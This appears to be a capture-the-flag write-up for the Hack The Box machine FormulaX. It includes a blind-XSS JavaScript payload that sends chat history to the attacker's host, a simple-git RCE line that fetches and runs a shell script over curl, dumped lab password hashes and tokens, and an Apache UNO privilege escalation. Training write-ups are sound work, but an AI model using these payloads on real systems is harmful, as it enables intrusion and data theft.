<h1 align="center"> FormulaX </h1>

<p align="center">
    <a href="https://app.hackthebox.com/machines/592">
        <img src="images/FormulaX.png" width="500">
    </a>
</p>

## Table of Contents

1. [Service Enumeration](#1-recon)
2. [Service analysis on TCP/80](#2-tcp---80)
3. [XSS](#3-xss)
4. [CVE-2022-25912](#4-cve-2022-25912)
5. [Privilege Escalation](#5-user-to-root)
6. [Pwned Info](#pwned-info)

## 1. Recon

```bash
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.6
Nmap scan report for 10.10.11.6
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-cors: GET POST
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 13:01:39 2024 -- 1 IP address (1 host up) scanned in 25.25 seconds
```

## 2. TCP - 80

There is an active service on port 80 ! 

<p align="center">
  <img src="images/home.png" />
</p>

We can register to the service.

<p align="center">
  <img src="images/register.png" />
</p>

After registering and logging in we see the following page:

<p align="center">
  <img src="images/after_login.png" />
</p>

We can chat with a *Chatbot*

<p align="center">
  <img src="images/chatbot.png" />
</p>

and contact the Admin.

<p align="center">
  <img src="images/contact_us.png" />
</p>

## 3. XSS

After trying some normal XSS payloads, I realized that it could be blind XSS and I tried to send the following command

`<img src='http://10.10.14.97:1234/asd.sh'`

and I received the following response:

```bash
└─$ python -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.11.6 - - [13/Mar/2024 13:20:52] code 404, message File not found
10.10.11.6 - - [13/Mar/2024 13:20:52] "GET /asd.sh HTTP/1.1" 404 -
```

So I started analyzing the JavaScript files and I found, in *chat.js*, how to interact with the bot.

<p align="center">
  <img src="images/chat_js.png" />
</p>

Thanks to the information found I created the following JS file:

```js
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);

script.addEventListener('load', function() {
	const res = axios.get(`/user/api/chat`);
	const socket = io('/',{withCredentials: true});

	//listening for the messages
	socket.on('message', (my_message) => {
		fetch("http://10.10.14.97:1234/?d=" + btoa(my_message));
	});
	socket.emit('client_message', 'history')
});
```

So I sent the following payload:

<p align="center">
  <img src="images/xss.png" />
</p>

The response received from the server is:

```bash
10.10.11.6 - - [13/Mar/2024 13:51:27] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [13/Mar/2024 13:51:27] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.10.11.6 - - [13/Mar/2024 13:51:27] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [13/Mar/2024 13:51:27] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
10.10.11.6 - - [13/Mar/2024 13:51:27] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [13/Mar/2024 13:51:27] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
10.10.11.6 - - [13/Mar/2024 13:51:27] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [13/Mar/2024 13:51:27] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
```

Decoding the received strings we obtain the following message:

```text
Greetings!. How can i help you today ?. You can type help to see some buildin commands
Hello, I am Admin.Testing the Chat Application
Write a script for  dev-git-auto-update.chatbot.htb to work properly
Write a script to automate the auto-update
```

So I added `dev-git-auto-update.chatbot.htb` to */etc/hosts* and I visited the page.

<p align="center">
  <img src="images/dev_git.png" />
</p>

## 4. CVE-2022-25912

Searching for exploits for *simple-git v3.14* I found [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221) which mentions the possibility of performing an RCE. Then I opened a shell with the following command: `ext::sh -c curl http://IP:PORT/shell.sh|sh`.

<p align="center">
  <img src="images/rev.png" />
</p>

We don't have access to the user flag so we have to find a way to do lateral moving. After a bit of research I saw that MongoDB is present, so I started interacting and found some credentials.

```bash
> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
> use testings
switched to db testing
> show collections
messages
users
> db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAzMzU0OTB9.DhV-tuE0oH9z33a6daRGhWp5zkFTZqy__tN55Pnommw", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
{ "_id" : ObjectId("65f1a42701ec747df75c341c"), "name" : "test@tt.com", "email" : "test@tt.com", "password" : "$2b$10$0q10xCg1dMi3FqWFhFu9u.yV2HZy6qJBevS6Rb5H3vTYeAc/suz9C", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWYxYTQyNzAxZWM3NDdkZjc1YzM0MWMiLCJpYXQiOjE3MTAzMzUwMzJ9.7sRoNaDPbassQla9BMe40wr7P4nGTOjHPbhR-WMTX20", "__v" : 0 }
```

So I cracked the hash of *frank_dorky*.

<p align="center">
  <img src="images/crack_hash.png" />
</p>

After connecting via ssh, I have the flag in the home directory.

## 5. User to ROOT

Loading [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) I found an interesting configuration file.

<p align="center">
  <img src="images/librenms.png" />
</p>

Then I did port forwarding via ssh with the following command: `ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6`.

<p align="center">
  <img src="images/login.png" />
</p>

Searching on internet for information on *LibreNMS* I found the [repository](https://github.com/librenms/librenms/tree/master) containing the source code. After analyzing the configuration files and scripts present, I saw that by running *config_to_json.php* I can have all the configurations in the form of json.

<p align="center">
  <img src="images/cred.png" />
</p>

Using the credentials found, we can connect via ssh with the user *kai_relay*. After that I ran the `sudo -l` command.

<p align="center">
  <img src="images/sudo.png" />
</p>

Seeing that it opens a socket then I did port forwarding and executed the script as sudo. What I receive, via wget, is an *index.html* file that contains the following string:

`e��'com.sun.star.bridge.XProtocolPropertiesUrpProtocolProperties.UrpProtocolPropertiesTidtq��`

Searching for the string on the internet, I find a [repository](https://github.com/sud0woodo/ApacheUNO-RCE) that mentions the possibility of an RCE. 

So I create:

- *exploit.py* which contains the script found in the repository (changing the name of the file to execute);
- *shell.sh* which contains the shell to execute.

By running the exploit and the script (with administrator permissions) at the same time, we have the shell.

<p align="center">
  <img src="images/rev2.png" />
</p>

In */root* there is the root flag.

## Pwned Info

<p align="center">
    <a href="https://www.hackthebox.com/achievement/machine/805273/592">
        <img src="images/Pwned.png" width="600">
    </a>
</p>